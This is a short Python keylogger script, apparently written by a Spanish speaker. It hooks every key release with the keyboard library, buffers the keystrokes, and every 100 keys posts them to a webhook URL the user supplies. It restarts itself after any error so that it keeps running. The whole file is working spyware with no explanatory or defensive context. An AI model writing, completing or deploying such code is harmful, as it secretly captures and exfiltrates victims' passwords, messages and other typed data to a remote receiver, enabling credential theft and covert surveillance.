import keyboard
import requests
import subprocess
import sys

webhook_url = "Introducir aquí el webhook"
inputs = []

while True:
    try:
        def on_key(event):
            if event.name == "space":
                inputs.append(" ")
            elif event.name == "mayusculas":
                pass
            elif event.name == "backspace":
                pass
            elif event.name == "bloq mayus":
                pass
            elif event.name == "alt":
                pass

            else:
                inputs.append(event.name)

            if len(inputs) == 100:
                message = " ".join(inputs)
                payload = {"content": message}
                response = requests.post(webhook_url, json=payload)
                response.raise_for_status()
                inputs.clear()

        keyboard.on_release(on_key)
        keyboard.wait()

    except Exception as e:
        python_executable = sys.executable
        subprocess.run([python_executable, sys.argv[0]])